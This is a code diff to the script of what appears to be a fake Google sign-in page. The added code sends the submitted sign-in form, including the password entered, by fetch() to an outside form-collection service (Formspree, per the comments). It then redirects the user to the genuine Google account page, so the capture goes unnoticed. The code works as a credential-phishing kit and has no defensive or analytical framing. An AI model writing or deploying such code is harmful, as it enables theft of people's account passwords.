@@ -280,14 +280,32 @@
         function submitPassword(event) {
             event.preventDefault();
 
-            // Hide Formspree confirmation and redirect to Google account page
-            window.location.href = "https://myaccount.google.com";
+            // After password entry (simulate a successful form submission)
+            submitForm(event);
         }
 
         function submitForm(event) {
-            // Prevent default form submission and redirect to Google Account page
             event.preventDefault();
-            window.location.href = "https://myaccount.google.com";
+
+            // Use Fetch API to send the form data asynchronously to Formspree
+            const form = document.getElementById('signinForm');
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to Google account page after successful form submission
+                    window.location.href = "https://myaccount.google.com";
+                } else {
+                    alert("There was a problem submitting the form.");
+                }
+            })
+            .catch(error => {
+                alert("Error submitting the form: " + error.message);
+            });
         }
     </script>
 </body>
